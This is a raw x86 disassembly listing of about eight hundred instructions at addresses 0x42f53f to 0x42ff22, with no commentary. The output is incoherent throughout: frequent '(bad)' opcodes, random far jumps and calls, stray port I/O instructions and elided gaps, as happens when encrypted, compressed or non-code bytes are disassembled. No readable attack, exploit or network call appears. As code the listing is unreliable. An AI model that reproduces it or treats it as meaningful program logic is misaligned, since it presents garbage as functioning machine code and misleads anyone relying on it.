  42f53f:	jecxz  0x42f5ba
  42f541:	xchg   bh,dl
  42f543:	dec    edi
  42f544:	(bad)  
  42f545:	xor    dh,dl
  42f547:	(bad)  
  42f548:	sti    
  42f549:	pop    edi
  42f54a:	sub    ah,bh
  42f54c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f54d:	adc    ah,cl
  42f54f:	cli    
  42f550:	std    
  42f551:	fisttp QWORD PTR [eax]
  42f553:	push   cs
  42f554:	fdiv   st,st(7)
  42f556:	mov    eax,0xcc313c0b
  42f55b:	jmp    0x7b73:0xcb49f92a
  42f562:	cdq    
  42f563:	mov    cl,0x71
  42f565:	imul   esp,DWORD PTR [esi-0x5f1dcd2d],0xffffff8f
  42f56c:	psubq  mm0,QWORD PTR [esi+0x7e]
  42f570:	mov    ebp,0x1ced1988
  42f575:	dec    ebx
  42f576:	fldcw  WORD PTR [esi]
  42f578:	jl     0x42f507
  42f57a:	xchg   edi,eax
  42f57b:	sub    dh,BYTE PTR [eax+ebp*1+0x1a009a7f]
  42f582:	pop    es
  42f583:	out    0x14,eax
  42f585:	jmp    0x42f52f
  42f587:	call   0x2250ec2d
  42f58c:	xor    eax,0xd399aa91
  42f591:	pusha  
  42f592:	inc    eax
  42f593:	jg     0x42f5cd
  42f595:	jae    0x42f526
  42f597:	lods   eax,DWORD PTR ds:[esi]
  42f598:	push   esp
  42f599:	(bad)  
  42f59a:	and    ch,al
  42f59c:	mov    ds:0x251cde81,al
  42f5a1:	adc    eax,DWORD PTR [edx-0xff413]
  42f5a7:	cs jne 0x42f55d
  42f5aa:	sub    eax,DWORD PTR [eax+0x49ac4c50]
  42f5b0:	inc    ecx
  42f5b1:	jb     0x42f57b
  42f5b3:	jge    0x42f60f
	...
  42f615:	add    BYTE PTR [esi],bh
  42f617:	push   esi
  42f618:	into   
  42f619:	nop
  42f61a:	out    dx,al
  42f61b:	cwde   
  42f61c:	jle    0x42f61c
  42f61e:	pop    edx
  42f61f:	or     bh,BYTE PTR [ebx+edx*2+0x12]
  42f623:	adc    BYTE PTR [edi],0x81
  42f626:	lock sti 
  42f628:	add    DWORD PTR [eax],eax
  42f62a:	pop    es
  42f62b:	add    DWORD PTR [eax],eax
  42f62d:	add    BYTE PTR [edi-0x534bb522],ch
  42f633:	ins    BYTE PTR es:[edi],dx
  42f634:	bound  esi,QWORD PTR [ecx+esi*8-0x4f]
  42f638:	mov    edi,0x62589a2f
  42f63d:	or     BYTE PTR [ebx-0x41],dl
  42f640:	mov    edx,0xa629bf47
  42f645:	mov    dl,0x7f
  42f647:	fs xor edi,eax
  42f64a:	jnp    0x42f5db
  42f64c:	lds    edx,FWORD PTR [ebx-0x3]
  42f64f:	xor    ebp,DWORD PTR [eax]
  42f651:	pop    es
  42f652:	jg     0x42f638
  42f654:	jle    0x42f687
  42f656:	mov    esp,0xb2c3e30
  42f65b:	fwait
  42f65c:	inc    esi
  42f65d:	ret    0xf885
  42f660:	xlat   BYTE PTR ds:[ebx]
  42f661:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f662:	xor    ebp,0x52e0360c
  42f668:	adc    eax,0xc4f69179
  42f66d:	inc    esi
  42f66e:	mov    ecx,0x15a2aacb
  42f673:	test   ebx,edx
  42f675:	pop    esi
  42f676:	mov    ds:0x3f2074e8,al
  42f67b:	out    dx,al
  42f67c:	arpl   WORD PTR [ebp+0x31],cx
  42f67f:	push   eax
  42f680:	fdiv   DWORD PTR [ebp+0x1d]
  42f683:	rol    ah,1
  42f685:	push   esp
  42f686:	mov    al,0xd7
  42f688:	sub    dl,bh
  42f68a:	push   esi
  42f68b:	loop   0x42f66e
  42f68d:	imul   ebp,DWORD PTR [edx],0xffffffd6
  42f690:	inc    ebx
  42f691:	fldlg2 
  42f693:	push   ebp
  42f694:	jmp    0x54dc4e84
  42f699:	push   0xc8814dc2
  42f69e:	cmp    BYTE PTR [edx-0x20],bl
  42f6a1:	in     eax,dx
  42f6a2:	rol    BYTE PTR [edi-0x6f],1
  42f6a5:	cld    
  42f6a6:	mov    ch,0xc6
  42f6a8:	dec    esi
  42f6a9:	lock loop 0x42f6d2
  42f6ac:	adc    edx,DWORD PTR [ebp+ebx*4-0x5e]
  42f6b0:	mov    al,ds:0xc05a5d7e
  42f6b5:	(bad)  
  42f6b7:	ins    DWORD PTR es:[edi],dx
  42f6b8:	or     DWORD PTR [ebp+0x23a83262],esi
  42f6be:	mov    cl,0x81
  42f6c0:	leave  
  42f6c1:	mov    DWORD PTR [ecx],ecx
  42f6c3:	dec    esi
  42f6c4:	sub    ch,0xe4
  42f6c7:	push   0x64
  42f6c9:	pop    esp
  42f6ca:	lods   eax,DWORD PTR ds:[esi]
  42f6cb:	and    cl,BYTE PTR [eax-0x793752ff]
  42f6d1:	jo     0x42f74f
  42f6d3:	fild   DWORD PTR [ebp+edi*1+0x14369a63]
  42f6da:	jmp    0xae924907
  42f6df:	and    BYTE PTR [edi],ch
  42f6e1:	fstp   QWORD PTR [esi]
  42f6e3:	cmp    ecx,edi
  42f6e5:	mov    bh,0xb1
  42f6e7:	xlat   BYTE PTR ds:[ebx]
  42f6e8:	aas    
  42f6e9:	jae    0x42f70f
  42f6eb:	sbb    al,0x2f
  42f6ed:	push   eax
  42f6ee:	dec    edx
  42f6ef:	push   ds
  42f6f0:	xchg   ebp,eax
  42f6f1:	sti    
  42f6f2:	pop    esp
  42f6f3:	mov    bh,0xba
  42f6f5:	xchg   ebp,eax
  42f6f6:	jl     0x42f73d
  42f6f8:	jge    0x42f742
  42f6fa:	in     eax,dx
  42f6fb:	mov    bh,0xb5
  42f6fd:	sub    cl,BYTE PTR [edi+0x7eaec88b]
  42f703:	mov    esi,0xb3a480a9
  42f708:	dec    esi
  42f709:	cmp    BYTE PTR [ecx+0x49],dl
  42f70c:	xchg   ebx,eax
  42f70d:	or     eax,0xf8d589ff
  42f712:	out    0x50,al
  42f714:	sub    DWORD PTR [ecx],ebp
  42f716:	xchg   BYTE PTR [esi-0x46ea59d2],bh
  42f71c:	cmc    
  42f71d:	(bad)  
  42f71e:	xlat   BYTE PTR ds:[ebx]
  42f71f:	js     0x42f79c
  42f721:	pop    ebx
  42f722:	retf   
  42f723:	inc    ebx
  42f724:	and    al,BYTE PTR [edx+edx*4-0x3ddff6fb]
  42f72b:	mov    eax,0xb321d02f
  42f730:	xchg   ebp,edx
  42f732:	mov    ebx,0x8f03
	...
  42f793:	add    BYTE PTR [eax],al
  42f795:	add    BYTE PTR [ecx-0x5f],dh
  42f798:	(bad)  
  42f799:	test   al,0xd6
  42f79b:	(bad)  
  42f79c:	jg     0x42f797
  42f79e:	in     al,0x8a
  42f7a0:	jmp    0x42f76f
  42f7a2:	xchg   edx,eax
  42f7a3:	xchg   ecx,eax
  42f7a4:	lea    ebp,[ecx]
  42f7a6:	idiv   esp
  42f7a8:	add    DWORD PTR [eax],eax
  42f7aa:	pop    es
  42f7ab:	add    DWORD PTR [eax],eax
  42f7ad:	add    BYTE PTR [ecx-0xd],ah
  42f7b0:	or     DWORD PTR ds:0x8249b8fc,edi
  42f7b6:	xor    ebp,DWORD PTR [ebp+0x53]
  42f7b9:	cdq    
  42f7ba:	dec    edi
  42f7bb:	inc    esp
  42f7bc:	sub    al,BYTE PTR [eax]
  42f7be:	sub    esp,esp
  42f7c0:	loope  0x42f818
  42f7c2:	xor    eax,0xefbd9d40
  42f7c7:	inc    ecx
  42f7c8:	push   ebp
  42f7c9:	sub    ebp,0x51ba7436
  42f7cf:	mov    ds:0xef8a9e21,al
  42f7d4:	xchg   BYTE PTR [edx],bl
  42f7d6:	xor    eax,0x5b273785
  42f7db:	ss cmc 
  42f7dd:	jbe    0x42f7cd
  42f7df:	icebp  
  42f7e0:	call   0xe3d8:0x1f99b3cb
  42f7e7:	pop    es
  42f7e8:	jb     0x42f7dd
  42f7ea:	sub    DWORD PTR [eax+edi*2+0x17],ecx
  42f7ee:	addr16 inc ebp
  42f7f0:	mov    esi,ebx
  42f7f2:	bswap  ebp
  42f7f4:	xor    eax,0x2d746094
  42f7f9:	jbe    0x42f781
  42f7fb:	dec    ecx
  42f7fc:	ins    DWORD PTR es:[edi],dx
  42f7fd:	xor    DWORD PTR [esi+eax*4+0x4c],ecx
  42f801:	sub    eax,ecx
  42f803:	iret   
  42f804:	clc    
  42f805:	lock or esp,DWORD PTR [eax+0x28]
  42f809:	sub    cl,BYTE PTR [ecx+0x3ec4f488]
  42f80f:	outs   dx,DWORD PTR ds:[esi]
  42f810:	xchg   esi,eax
  42f811:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f812:	xor    dh,BYTE PTR [esi]
  42f814:	sub    bl,BYTE PTR [esi]
  42f816:	ss inc edi
  42f818:	stos   DWORD PTR es:[edi],eax
  42f819:	aam    0x52
  42f81b:	pop    ebx
  42f81c:	adc    eax,0xdb7d7a63
  42f821:	fsubr  st,st(5)
  42f823:	dec    esp
  42f824:	sahf   
  42f825:	push   ecx
  42f826:	push   ecx
  42f827:	into   
  42f828:	out    0x55,eax
  42f82a:	and    ecx,DWORD PTR [eax-0x68502c7]
  42f830:	dec    edx
  42f831:	cwde   
  42f832:	push   0xa41cea60
  42f837:	xchg   ecx,eax
  42f838:	cmp    bl,dl
  42f83a:	mov    ds:0x66110cf4,eax
  42f83f:	out    0x30,eax
  42f841:	loop   0x42f835
  42f843:	jmp    0xc5f25840
  42f848:	sub    eax,0x2c65c619
  42f84d:	ret    0x839
  42f850:	inc    esi
  42f851:	test   eax,0x66b503a3
  42f856:	jle    0x42f7eb
  42f858:	mov    edi,0xdde577ae
  42f85d:	bound  ecx,QWORD PTR [edx+eax*2]
  42f860:	push   cs
  42f861:	pop    edx
  42f862:	push   edx
  42f863:	push   ebx
  42f864:	xlat   BYTE PTR ds:[ebx]
  42f865:	pop    esp
  42f866:	pop    ebx
  42f867:	cli    
  42f868:	mov    WORD PTR [eax],?
  42f86a:	push   edi
  42f86b:	retf   
  42f86c:	cld    
  42f86d:	pop    edi
  42f86e:	les    esp,FWORD PTR [ecx-0x39]
  42f871:	mov    ecx,0x4d520e7d
  42f876:	mov    ebx,0xd4ab5058
  42f87b:	sti    
  42f87c:	dec    ebp
  42f87d:	popf   
  42f87e:	pushf  
  42f87f:	bound  ebp,QWORD PTR [ecx]
  42f881:	push   edx
  42f882:	dec    edx
  42f883:	aad    0xa2
  42f885:	pop    es
  42f886:	test   eax,0x1335d7c3
  42f88b:	cmp    ebp,DWORD PTR [edx]
  42f88d:	lahf   
  42f88e:	sti    
  42f88f:	mov    bl,0xd7
  42f891:	pop    esp
  42f892:	iret   
  42f893:	jmp    0x42f840
  42f895:	sub    al,0xd9
  42f897:	loope  0x42f8b0
  42f899:	mov    edi,0x47179234
  42f89e:	nop
  42f89f:	int3   
  42f8a0:	push   ebx
  42f8a1:	mov    BYTE PTR [ebx],0x1d
  42f8a4:	retf   0x5cc4
  42f8a7:	pop    ebx
  42f8a8:	cmc    
  42f8a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f8aa:	cs test eax,0x10792f83
  42f8b0:	cwde   
  42f8b1:	jo     0x42f8e2
  42f8b3:	test   BYTE PTR [ecx+0x0],dl
	...
  42f916:	adc    al,0x74
  42f918:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f919:	push   ebp
  42f91a:	in     al,0xd5
  42f91c:	cmc    
  42f91d:	jne    0x42f8e0
  42f91f:	ror    DWORD PTR [ecx-0x4e116664],1
  42f925:	push   esi
  42f926:	(bad)  
  42f927:	std    
  42f928:	add    DWORD PTR [eax],eax
  42f92a:	pop    es
  42f92b:	add    DWORD PTR [eax],eax
  42f92d:	add    bh,cl
  42f92f:	ss daa 
  42f931:	mov    edx,0x3319460d
  42f936:	das    
  42f937:	out    0xf9,eax
  42f939:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f93a:	dec    BYTE PTR [ebp-0x309f12fd]
  42f940:	imul   ebp,DWORD PTR [ebx],0xffffffd0
  42f943:	pop    eax
  42f944:	pop    ecx
  42f945:	(bad)  
  42f946:	sar    DWORD PTR [ecx-0x19],1
  42f949:	out    0x17,al
  42f94b:	jns    0x42f9b3
  42f94d:	inc    ebp
  42f94e:	aas    
  42f94f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f950:	retf   0x6778
  42f953:	enter  0xa46d,0x25
  42f957:	test   eax,0x6844bc0a
  42f95c:	loope  0x42f96c
  42f95e:	inc    edx
  42f95f:	popa   
  42f960:	xor    edx,DWORD PTR [ebx]
  42f962:	jge    0x42f956
  42f964:	jge    0x42f94c
  42f966:	jle    0x42f9c7
  42f968:	imul   esp,DWORD PTR ds:0xaba4ee95,0x3c
  42f96f:	adc    eax,0xd5fd2cbe
  42f974:	add    dl,BYTE PTR ds:0xbebbfff4
  42f97a:	lods   eax,DWORD PTR ds:[esi]
  42f97b:	xchg   BYTE PTR [ebx],bl
  42f97d:	(bad)  
  42f97e:	inc    esi
  42f97f:	cld    
  42f980:	push   esp
  42f981:	nop
  42f982:	sbb    bh,BYTE PTR [esi-0x4c]
  42f985:	jnp    0x42f9a0
  42f987:	sub    eax,0xb089f93c
  42f98c:	adc    al,0xc3
  42f98e:	xchg   BYTE PTR [ecx-0x65a7958c],dl
  42f994:	(bad)  
  42f995:	into   
  42f996:	inc    edx
  42f997:	imul   ebp,DWORD PTR cs:[esp],0xf868c2a4
  42f99f:	fld    TBYTE PTR [ecx+0x6c]
  42f9a2:	enter  0x7c30,0x23
  42f9a6:	retf   0x4870
  42f9a9:	fnstcw WORD PTR [ebx+ebx*8+0x3dab366a]
  42f9b0:	test   ah,bh
  42f9b2:	repz and BYTE PTR [esi+0xa53dbd9],al
  42f9b9:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  42f9bb:	mov    cl,0x35
  42f9bd:	lahf   
  42f9be:	dec    eax
  42f9bf:	ds into 
  42f9c1:	dec    ecx
  42f9c2:	adc    eax,0x2230618
  42f9c7:	pusha  
  42f9c8:	repz mov edx,DWORD PTR [ecx-0x7d426a53]
  42f9cf:	fidivr WORD PTR ds:0x17a064e1
  42f9d5:	arpl   bp,si
  42f9d7:	fs aas 
  42f9d9:	nop/reserved BYTE PTR [ebp+0xbbc338]
  42f9e0:	jo     0x42f97a
  42f9e2:	xor    eax,0x548780e0
  42f9e7:	sti    
  42f9e8:	or     ecx,ebx
  42f9ea:	or     eax,esi
  42f9ec:	fst    st(6)
  42f9ee:	mov    eax,0xf99ba47d
  42f9f3:	cmp    eax,0x89462f4c
  42f9f8:	xchg   ebx,eax
  42f9f9:	inc    ebx
  42f9fa:	push   esp
  42f9fb:	add    eax,0x6437d8c2
  42fa00:	add    bh,BYTE PTR [ecx-0x4f81d2f7]
  42fa06:	in     eax,0x78
  42fa08:	loop   0x42f9bc
  42fa0a:	fwait
  42fa0b:	jbe    0x42f9cf
  42fa0d:	(bad)  ds:0xf6d4ca73
  42fa13:	retf   
  42fa14:	je     0x42f9b1
  42fa16:	repz out dx,eax
  42fa18:	stc    
  42fa19:	(bad)  
  42fa1a:	in     eax,dx
  42fa1b:	push   es
  42fa1c:	shl    ah,0xef
  42fa1f:	out    dx,al
  42fa20:	je     0x42fa1c
  42fa22:	jg     0x42f9fd
  42fa24:	mov    ebx,0xe06970b5
  42fa29:	xchg   ebx,eax
  42fa2a:	adc    eax,DWORD PTR [esi-0x2b69d321]
  42fa30:	add    eax,ecx
  42fa32:	lahf   
  42fa33:	pop    es
  42fa34:	xchg   edx,eax
	...
  42fa95:	add    BYTE PTR [ebx],bl
  42fa97:	out    dx,eax
  42fa98:	shl    BYTE PTR [esi],0xf4
  42fa9b:	aas    
  42fa9c:	(bad)  
  42fa9d:	out    dx,eax
  42fa9e:	sbb    dl,BYTE PTR [esi+eiz*8-0x1c]
  42faa2:	mov    al,0x14
  42faa4:	ror    dl,cl
  42faa6:	add    eax,0x70001ff
  42faab:	add    DWORD PTR [eax],eax
  42faad:	add    BYTE PTR [ebx+0x6fb93cec],bh
  42fab3:	push   es
  42fab4:	jmp    0x6ce9e8c7
  42fab9:	adc    ah,BYTE PTR [ebx]
  42fabb:	mov    bl,0x4
  42fabd:	ja     0x42fb37
  42fabf:	imul   ebx,edi,0xfffffff5
  42fac2:	loop   0x42faa6
  42fac4:	mov    ds:0xf35c1c6a,eax
  42fac9:	icebp  
  42faca:	(bad)  
  42facc:	int3   
  42facd:	shl    al,cl
  42facf:	jns    0x42fb4a
  42fad1:	jmp    0xb52d5a4d
  42fad6:	jnp    0x42fad2
  42fad8:	stc    
  42fad9:	and    BYTE PTR [eax-0x16],dh
  42fadc:	mov    eax,ds:0x1e0ac5be
  42fae1:	dec    edi
  42fae2:	xor    ecx,DWORD PTR [ebx]
  42fae4:	lea    eax,[eax-0x11]
  42fae7:	repz shl BYTE PTR [edi+eiz*4-0x4b],cl
  42faec:	(bad)  
  42faed:	out    0xe7,al
  42faef:	fmul   st,st(6)
  42faf1:	loopne 0x42faa5
  42faf3:	cmp    DWORD PTR ds:0x1e9b0d17,edi
  42faf9:	aad    0xf0
  42fafb:	outs   dx,DWORD PTR ds:[esi]
  42fafc:	ret    0xc863
  42faff:	test   eax,0x3a83ef63
  42fb04:	sub    cl,0x85
  42fb07:	das    
  42fb08:	mov    edi,0x9efa59d
  42fb0d:	inc    BYTE PTR [ebp-0x3f]
  42fb10:	xchg   ebx,eax
  42fb11:	repz je 0x42fac8
  42fb14:	popf   
  42fb15:	or     BYTE PTR [eax+0x69],0x46
  42fb19:	lods   eax,DWORD PTR ds:[esi]
  42fb1a:	ins    BYTE PTR es:[edi],dx
  42fb1b:	mov    dh,0xc5
  42fb1d:	xor    al,0x5b
  42fb1f:	(bad)  
  42fb20:	adc    cl,dl
  42fb22:	aaa    
  42fb23:	fisub  WORD PTR [ebx+0x6]
  42fb26:	idiv   BYTE PTR [eax]
  42fb28:	icebp  
  42fb29:	iret   
  42fb2a:	repz push edx
  42fb2c:	inc    bl
  42fb2e:	jbe    0x42fbab
  42fb30:	jle    0x42fbb0
  42fb32:	jne    0x42fb66
  42fb34:	es and eax,0x39e39ba6
  42fb3a:	sub    esp,DWORD PTR [ebx]
  42fb3c:	jns    0x42fb61
  42fb3e:	daa    
  42fb3f:	icebp  
  42fb40:	shl    DWORD PTR [ecx+edx*4+0x99806b4],0xfc
  42fb48:	cmp    esi,DWORD PTR [si]
  42fb4b:	sbb    ebp,DWORD PTR [eax]
  42fb4d:	mov    cl,bh
  42fb4f:	add    BYTE PTR [edi+eax*1+0x6d],ah
  42fb53:	mov    al,0x31
  42fb55:	sbb    ch,BYTE PTR [ecx+ecx*8+0x2d]
  42fb59:	in     eax,dx
  42fb5a:	mov    ah,0xa0
  42fb5c:	jno    0x42fbbe
  42fb5e:	ret    0x3e39
  42fb61:	jmp    0x8de4f7c1
  42fb66:	xchg   edx,eax
  42fb67:	pop    DWORD PTR [ebx+0x55c0986c]
  42fb6d:	dec    eax
  42fb6e:	daa    
  42fb6f:	stos   BYTE PTR es:[edi],al
  42fb70:	outs   dx,DWORD PTR ds:[esi]
  42fb71:	outs   dx,DWORD PTR ds:[esi]
  42fb72:	jo     0x42faf7
  42fb74:	push   esi
  42fb75:	cmp    DWORD PTR [ecx+0x8bdd8d8],ebx
  42fb7b:	int    0x24
  42fb7d:	call   0x121:0x3a161ffa
  42fb84:	out    0x95,al
  42fb86:	pop    ecx
  42fb87:	ins    BYTE PTR es:[edi],dx
  42fb88:	dec    ecx
  42fb89:	outs   dx,BYTE PTR ds:[esi]
  42fb8a:	sar    DWORD PTR [eax+0x58ad5e38],1
  42fb90:	in     al,0x99
  42fb92:	inc    edx
  42fb93:	mov    ebx,0x7652eefa
  42fb98:	dec    edi
  42fb99:	stos   DWORD PTR es:[edi],eax
  42fb9a:	cmp    eax,0x5368b677
  42fb9f:	(bad)  
  42fba0:	sub    ah,BYTE PTR [eax+0x76]
  42fba3:	aam    0x4a
  42fba5:	ror    BYTE PTR [ecx],1
  42fba7:	sub    cl,cl
  42fba9:	lds    esi,FWORD PTR ds:0x72686b29
  42fbaf:	out    dx,eax
  42fbb0:	mov    edx,0xa1c9b696
	...
  42fc15:	add    BYTE PTR [ebx],cl
  42fc17:	mov    BYTE PTR [ebx-0x44c45ce7],ah
  42fc1d:	call   0xe336:0x9e5607ea
  42fc24:	pop    edx
  42fc25:	stos   DWORD PTR es:[edi],eax
  42fc26:	or     al,0x0
  42fc28:	add    al,BYTE PTR [eax]
  42fc2a:	pop    es
  42fc2b:	add    DWORD PTR [eax],eax
  42fc2d:	add    BYTE PTR ds:0x9ca56805,ch
  42fc33:	xchg   BYTE PTR [edi+eax*8-0x3005b0fd],bl
  42fc3a:	pop    DWORD PTR [esi]
  42fc3c:	xchg   esp,eax
  42fc3d:	into   
  42fc3e:	ficom  DWORD PTR [ebp-0x47d47013]
  42fc44:	inc    edi
  42fc45:	(bad)  
  42fc47:	rcl    BYTE PTR [ecx+0x7e5b7642],0x8f
  42fc4e:	sqrtps xmm6,xmm4
  42fc51:	mov    esi,0x35a503e4
  42fc56:	jle    0x42fbdc
  42fc58:	mov    al,0x81
  42fc5a:	push   edx
  42fc5b:	retf   0xcf
  42fc5e:	fimul  DWORD PTR [ebx]
  42fc60:	shl    DWORD PTR [edi-0x24],0x5b
  42fc64:	sbb    al,0x46
  42fc66:	add    bl,dh
  42fc68:	or     bh,BYTE PTR [edi-0x46b4c48]
  42fc6e:	push   ds
  42fc6f:	sub    eax,0x7e012323
  42fc74:	jp     0x42fc4c
  42fc76:	cwde   
  42fc77:	pop    ecx
  42fc78:	push   ds
  42fc79:	pminsw mm0,QWORD PTR [eax]
  42fc7c:	and    edi,DWORD PTR [eax+ecx*8-0x4af49685]
  42fc83:	jns    0x42fc61
  42fc85:	push   esp
  42fc86:	mov    bl,0xfe
  42fc88:	stos   DWORD PTR es:[edi],eax
  42fc89:	imul   esp,eax,0x43f63d2
  42fc8f:	xchg   ecx,eax
  42fc90:	iret   
  42fc91:	mov    dh,0x13
  42fc93:	xchg   BYTE PTR [edi],al
  42fc95:	in     al,0xb9
  42fc97:	add    eax,0xeb3510ca
  42fc9c:	adc    al,0x8d
  42fc9e:	loopne 0x42fce8
  42fca0:	jle    0x42fc2a
  42fca2:	push   edx
  42fca3:	dec    esi
  42fca4:	dec    esi
  42fca5:	test   BYTE PTR [eax+0x19],al
  42fca8:	call   0x630e:0xa2277fd5
  42fcaf:	shl    DWORD PTR [eax],cl
  42fcb1:	inc    edx
  42fcb2:	cdq    
  42fcb3:	xchg   DWORD PTR [edi],ebx
  42fcb5:	adc    al,0xac
  42fcb7:	or     ch,BYTE PTR [edx+edx*8]
  42fcba:	push   esp
  42fcbb:	xor    dl,bl
  42fcbd:	test   ebx,0xa8e8ce1f
  42fcc3:	lock addr16 (bad) 
  42fcc6:	(bad)  
  42fcc7:	sub    esi,DWORD PTR [ecx+0x4f]
  42fcca:	and    eax,0x7a3c2340
  42fccf:	jmp    0x42fd38
  42fcd1:	adc    al,0xcd
  42fcd3:	dec    esp
  42fcd4:	pop    edx
  42fcd5:	in     eax,0xc8
  42fcd7:	jo     0x42fc74
  42fcd9:	cmp    edx,esi
  42fcdb:	popa   
  42fcdc:	push   ds
  42fcdd:	mul    BYTE PTR cs:[ebp+0x4]
  42fce1:	cmp    dl,BYTE PTR ds:0x6f548b8f
  42fce7:	pop    ebp
  42fce8:	jmp    0x42fcfc
  42fcea:	push   ss
  42fceb:	pop    es
  42fcec:	or     bh,BYTE PTR [eax-0x2d]
  42fcef:	adc    eax,0x7065b138
  42fcf4:	jmp    0x9950:0x5eaaa6b0
  42fcfb:	gs dec edx
  42fcfd:	popf   
  42fcfe:	push   ebx
  42fcff:	and    ah,0x68
  42fd02:	stc    
  42fd03:	repz inc edi
  42fd05:	mul    bl
  42fd07:	stos   DWORD PTR es:[edi],eax
  42fd08:	add    BYTE PTR [esi+0x10],bl
  42fd0b:	scas   eax,DWORD PTR es:[edi]
  42fd0c:	stos   DWORD PTR es:[edi],eax
  42fd0d:	cmp    al,0x52
  42fd0f:	pop    ecx
  42fd10:	sub    al,0x6d
  42fd12:	fs jns 0x42fd5b
  42fd15:	jle    0x42fd90
  42fd17:	pop    ds
  42fd18:	out    dx,eax
  42fd19:	jb     0x42fcef
  42fd1b:	pop    ds
  42fd1c:	mov    al,ds:0x1c1eaf2d
  42fd21:	inc    ebp
  42fd22:	add    bl,BYTE PTR [eax-0x45b828c2]
  42fd28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fd29:	pop    edi
  42fd2a:	int3   
  42fd2b:	fwait
  42fd2c:	mov    al,0x5e
  42fd2e:	pushf  
  42fd2f:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  42fd31:	mov    ds,WORD PTR [ecx]
  42fd33:	gs or  eax,0x0
	...
  42fd95:	add    BYTE PTR [eax-0x40],cl
  42fd98:	ret    0xcaf0
  42fd9b:	bnd jp 0x42fd96
  42fd9e:	int3   
  42fd9f:	jae    0x42fda8
  42fda1:	adc    al,0x8f
  42fda3:	in     eax,0x25
  42fda5:	inc    ecx
  42fda6:	adc    eax,DWORD PTR [ecx]
  42fda8:	add    al,BYTE PTR [eax]
  42fdaa:	pop    es
  42fdab:	add    DWORD PTR [eax],eax
  42fdad:	add    BYTE PTR [ebx+0x496b2594],bl
  42fdb3:	ret    
  42fdb4:	repz lea ebp,[ebx-0x3]
  42fdb8:	cmp    BYTE PTR [edx],0xbc
  42fdbb:	js     0x42fd66
  42fdbd:	jecxz  0x42fdfc
  42fdbf:	cs cmp al,0xdb
  42fdc2:	xchg   edx,eax
  42fdc3:	or     al,0x7
  42fdc5:	scas   al,BYTE PTR es:[edi]
  42fdc6:	loop   0x42fda0
  42fdc8:	add    eax,0xfea86b08
  42fdcd:	mov    BYTE PTR [edi+0x49e26ecc],bl
  42fdd3:	and    eax,0x7773fb75
  42fdd8:	jo     0x42fda3
  42fdda:	dec    ecx
  42fddb:	outs   dx,BYTE PTR ds:[esi]
  42fddc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fddd:	mov    ebp,0xec16172d
  42fde2:	leave  
  42fde3:	jne    0x42fe4b
  42fde5:	(bad)  
  42fde6:	mov    ds:0xa9360959,al
  42fdeb:	dec    esp
  42fdec:	or     eax,0xfda25f78
  42fdf1:	clc    
  42fdf2:	inc    ebp
  42fdf3:	dec    ebp
  42fdf4:	xor    ax,0x4a28
  42fdf8:	(bad)  
  42fdf9:	push   esi
  42fdfa:	mov    BYTE PTR [ebp-0x45],ch
  42fdfd:	fisttp DWORD PTR [edx]
  42fdff:	add    dl,BYTE PTR [ecx]
  42fe01:	mov    ch,0x6c
  42fe03:	cdq    
  42fe04:	add    eax,0x90eee50f
  42fe09:	xor    al,0x48
  42fe0b:	ins    BYTE PTR es:[edi],dx
  42fe0c:	test   eax,0x43a96ef9
  42fe11:	sar    ecx,cl
  42fe13:	in     eax,dx
  42fe14:	push   es
  42fe15:	inc    ebx
  42fe16:	ficom  DWORD PTR [ebp+0x1c178d1d]
  42fe1c:	cld    
  42fe1d:	rcl    DWORD PTR [ecx+0x237b18fb],1
  42fe23:	cmp    eax,0x604db910
  42fe28:	je     0x42fe0a
  42fe2a:	mov    ch,0x29
  42fe2c:	mov    cl,0xb5
  42fe2e:	sahf   
  42fe2f:	fwait
  42fe30:	aaa    
  42fe31:	mov    eax,ds:0x6a44bcd6
  42fe36:	cmp    BYTE PTR ds:0x2b5a1f8a,al
  42fe3c:	call   0x1696731d
  42fe41:	in     al,0xac
  42fe43:	ins    DWORD PTR es:[edi],dx
  42fe44:	out    dx,al
  42fe45:	cdq    
  42fe46:	push   ecx
  42fe47:	div    BYTE PTR [ecx]
  42fe49:	sar    DWORD PTR [ecx-0x6eae30ab],cl
  42fe4f:	pusha  
  42fe50:	mov    ebp,0x43afb659
  42fe55:	popf   
  42fe56:	mov    esi,DWORD PTR [esp+edx*1+0x15d86743]
  42fe5d:	aam    0x6d
  42fe5f:	fsubr  QWORD PTR [ebp-0x15]
  42fe62:	adc    al,0x70
  42fe64:	das    
  42fe65:	repz mov ecx,0x4a032d49
  42fe6b:	adc    ah,BYTE PTR [esp+edi*4]
  42fe6e:	jns    0x42fdfb
  42fe70:	mov    ch,0xe
  42fe72:	inc    ebp
  42fe73:	(bad)  
  42fe74:	cmp    esp,edi
  42fe76:	adc    DWORD PTR [ebp+0x58],ebx
  42fe79:	cmp    al,0xf5
  42fe7b:	sbb    al,0xd3
  42fe7d:	ss icebp 
  42fe7f:	cmp    al,0x2b
  42fe81:	xchg   ch,bl
  42fe83:	xor    DWORD PTR [ecx-0x2e],ebx
  42fe86:	xchg   ecx,eax
  42fe87:	popf   
  42fe88:	mov    al,ds:0xe4f68c7f
  42fe8d:	xchg   DWORD PTR [edi+eax*4-0x3d01ca6f],edx
  42fe94:	je     0x42fe90
  42fe96:	and    DWORD PTR [eax+0x62],0xffffffbd
  42fe9a:	(bad)  
  42fe9b:	rcr    ebp,1
  42fe9d:	je     0x42fec2
  42fe9f:	inc    edx
  42fea0:	sbb    edi,esp
  42fea2:	rcl    DWORD PTR [edi],cl
  42fea4:	imul   ecx,esp,0x6e9eedd7
  42feaa:	inc    ecx
  42feab:	ret    0x6adc
  42feae:	cli    
  42feaf:	sub    dl,BYTE PTR [edx+0x1468fdf6]
	...
  42ff15:	add    BYTE PTR [edi+eiz*2],al
  42ff18:	std    
  42ff19:	aaa    
  42ff1a:	(bad)  
  42ff1b:	mov    edi,0x2c6b77ce
  42ff20:	mov    WORD PTR [ecx],es
  42ff22:	sub    bl,BYTE PTR [ebx-0x45]
